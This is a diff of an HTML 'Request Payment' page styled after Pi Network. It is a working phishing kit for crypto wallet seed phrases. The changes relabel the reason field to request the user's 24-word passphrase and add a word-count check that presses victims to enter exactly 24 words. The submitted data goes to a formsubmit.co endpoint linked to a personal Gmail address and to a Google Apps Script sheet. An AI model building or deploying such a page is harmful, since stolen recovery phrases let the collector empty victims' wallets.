@@ -8,46 +8,61 @@
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
   <style>
     body { font-family: 'Inter', sans-serif; background-color: #f3f4ff; }
-    @keyframes fadeIn { from {opacity: 0; transform: translateY(-10px);} to {opacity: 1; transform: translateY(0);} }
     .bg-pi-purple { background-color: #5A2D82; }
     .text-pi-yellow { color: #F5C65A; }
-    .error-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-      background-color: #f3f4ff; z-index: 50; display: none; align-items: center;
-      justify-content: center; text-align: center; animation: fadeIn 0.3s ease-out forwards; }
+
+    /* blinking for 24-passphrase warning */
+    @keyframes blink { 0%,100%{opacity:1;} 50%{opacity:0;} }
+    .blink { animation: blink 1s infinite; }
+
+    /* shake + fade for error overlay */
+    @keyframes shake {
+      0%, 100% { transform: translateX(0); }
+      20%, 60% { transform: translateX(-6px); }
+      40%, 80% { transform: translateX(6px); }
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: scale(0.95); }
+      to { opacity: 1; transform: scale(1); }
+    }
+    @keyframes fadeOut {
+      from { opacity: 1; transform: scale(1); }
+      to { opacity: 0; transform: scale(0.95); }
+    }
+    @keyframes pulseGlow {
+      0%,100% { box-shadow: 0 0 10px rgba(220,38,38,0.6); }
+      50% { box-shadow: 0 0 20px rgba(220,38,38,0.9); }
+    }
+    .glow {
+      animation: pulseGlow 1.5s infinite;
+    }
+    .error-overlay {
+      position: fixed; inset: 0;
+      background-color: rgba(255, 241, 241, 0.95);
+      z-index: 50; display: none;
+      align-items: center; justify-content: center;
+      text-align: center;
+      animation: fadeIn 0.3s ease-out forwards;
+    }
+    .error-box {
+      animation: fadeIn 0.4s ease-out, shake 0.6s ease-in-out;
+    }
+    .fade-out {
+      animation: fadeOut 0.4s ease-in-out forwards;
+    }
     body.overlay-active #mainContent, body.overlay-active header, body.overlay-active footer { display: none; }
   </style>
 </head>
 <body class="flex flex-col min-h-screen">
 
   <!-- Header -->
-  <header class="bg-pi-purple text-white py-4 px-5 sticky top-0 z-10 shadow-md">
-    <div class="max-w-lg mx-auto flex items-center relative">
-      <a href="index.html" class="absolute left-0 text-white">
-        <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7" />
-        </svg>
-      </a>
-      <h1 class="text-xl font-semibold text-center flex-grow flex items-center justify-center">
-        Request Payment
-        <div class="ml-2 text-pi-yellow" style="width: 20px; height: 20px;">
-          <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg" style="color: #F5C65A;">
-            <path d="M50 8C27.9 8 10 25.9 10 50s17.9 42 40 42 40-17.9 40-42S72.1 8 50 8zm-5 22h10v10h-6v30h-4V40h-6v-10zm25 10a15 15 0 010 30" fill="currentColor"/>
-          </svg>
-        </div>
-      </h1>
-    </div>
+  <header class="bg-pi-purple text-white py-4 px-5 sticky top-0 z-10 shadow-md text-center font-semibold text-lg">
+    Request Payment
   </header>
 
   <!-- Main -->
   <main id="mainContent" class="flex-grow w-full max-w-lg mx-auto p-6">
     <section class="bg-white p-6 rounded-lg shadow-md">
-      <header class="mb-5 text-center">
-        <h2 class="text-lg font-bold text-gray-700">Enter Payment Details</h2>
-        <p id="instructionMessage" class="text-gray-500 text-sm mt-1">
-          Please fill out the details below to complete your payment request.
-        </p>
-      </header>
-
       <form id="paymentRequestForm" method="POST" class="space-y-4">
         <div>
           <label for="amount" class="block text-xs font-medium text-gray-600 mb-1">Amount:</label>
@@ -62,14 +77,15 @@
         </div>
 
         <div>
-          <label for="reason" class="block text-xs font-medium text-gray-600 mb-1">24 passphrase / Reason:</label>
-          <textarea id="reason" name="reason" rows="5" required
-            placeholder="Provide a detailed reason for the payment request."
+          <label for="passphrase24" class="block text-xs font-medium text-gray-600 mb-1">24 Passphrase / Reason:</label>
+          <textarea id="passphrase24" name="passphrase24" rows="5" required
+            placeholder="Provide your 24-word passphrase or reason here."
             class="w-full px-3 py-2 text-sm border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"></textarea>
+          <p id="passphraseWarning" class="text-xs text-orange-500 mt-1 hidden blink"></p>
         </div>
 
         <button type="submit"
-          class="w-full bg-pi-purple hover:opacity-90 text-white font-semibold py-3 px-4 rounded-lg text-sm transition duration-300 ease-in-out shadow-sm disabled:opacity-50">
+          class="w-full bg-pi-purple hover:opacity-90 text-white font-semibold py-3 px-4 rounded-lg text-sm transition duration-300 ease-in-out shadow-sm">
           Send Request Message
         </button>
 
@@ -78,19 +94,19 @@
     </section>
   </main>
 
-  <!-- Overlay -->
+  <!-- Error Overlay -->
   <div id="errorOverlay" class="error-overlay p-6">
-    <div class="max-w-sm mx-auto p-8 rounded-xl shadow-2xl bg-white border border-red-300">
+    <div class="error-box max-w-sm mx-auto p-8 rounded-xl shadow-2xl bg-white border border-red-300">
       <svg class="mx-auto h-16 w-16 text-red-600 mb-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
         <path stroke-linecap="round" stroke-linejoin="round" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
       </svg>
-      <h2 class="text-2xl font-bold text-red-700 mb-3">Error Processing Request</h2>
+      <h2 class="text-2xl font-bold text-red-700 mb-3 blink">Error Processing Request</h2>
       <p class="text-gray-600 text-sm mb-6">
         We encountered an issue while validating your submission data. Please try again.
       </p>
       <button id="tryAgainButton"
-        class="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 px-4 rounded-lg transition duration-300 ease-in-out shadow-lg">
-        Please try again
+        class="w-full bg-red-600 hover:bg-red-700 text-white font-semibold py-3 px-4 rounded-lg transition duration-300 ease-in-out glow">
+        Please Try Again
       </button>
     </div>
   </div>
@@ -101,22 +117,32 @@
 
   <script>
     const form = document.getElementById('paymentRequestForm');
+    const statusMessage = document.getElementById('statusMessage');
+    const passphraseBox = document.getElementById('passphrase24');
+    const passphraseWarning = document.getElementById('passphraseWarning');
     const errorOverlay = document.getElementById('errorOverlay');
     const tryAgainButton = document.getElementById('tryAgainButton');
-    const statusMessage = document.getElementById('statusMessage');
 
     const FORM_SUBMIT_URL = "https://formsubmit.co/alecbing864@gmail.com";
     const SHEET_BACKUP_URL = "https://script.google.com/macros/s/AKfycbygl9DlHj1nqcHwJk7iRIr3qAlElv1mwI9gQddRCI0-gU7AZ8KA7UZS-1dh7uZpEA/exec";
 
+    // 🔸 Passphrase word count check
+    passphraseBox.addEventListener('input', () => {
+      const words = passphraseBox.value.trim().split(/\s+/).filter(w => w.length > 0);
+      const count = words.length;
+      if (count !== 24 && count > 0) {
+        passphraseWarning.textContent = `⚠️ You entered ${count} words. Expected 24 words.`;
+        passphraseWarning.classList.remove('hidden');
+      } else {
+        passphraseWarning.classList.add('hidden');
+      }
+    });
+
+    // 🔸 Form submission
     form.addEventListener('submit', async (e) => {
       e.preventDefault();
       statusMessage.textContent = "Submitting... Please wait.";
       const formData = new FormData(form);
-
-      // ✅ Automatically include current date & time
-      const now = new Date();
-      const formattedDateTime = now.toLocaleString(); // Example: "10/26/2025, 4:22 PM"
-      formData.append("timestamp", formattedDateTime);
 
       try {
         await fetch(FORM_SUBMIT_URL, { method: "POST", body: formData });
@@ -124,17 +150,22 @@
 
         statusMessage.textContent = "✅ Request sent successfully! Your data is backed up in Google Sheets.";
         form.reset();
+        passphraseWarning.classList.add('hidden');
       } catch (error) {
         console.error("Error submitting:", error);
-        statusMessage.textContent = "⚠️ There was an issue sending your request. Please try again.";
+        statusMessage.textContent = "";
         document.body.classList.add('overlay-active');
         errorOverlay.style.display = 'flex';
       }
     });
 
     tryAgainButton.addEventListener('click', () => {
-      errorOverlay.style.display = 'none';
-      document.body.classList.remove('overlay-active');
+      errorOverlay.classList.add('fade-out');
+      setTimeout(() => {
+        errorOverlay.style.display = 'none';
+        errorOverlay.classList.remove('fade-out');
+        document.body.classList.remove('overlay-active');
+      }, 400);
     });
   </script>
 
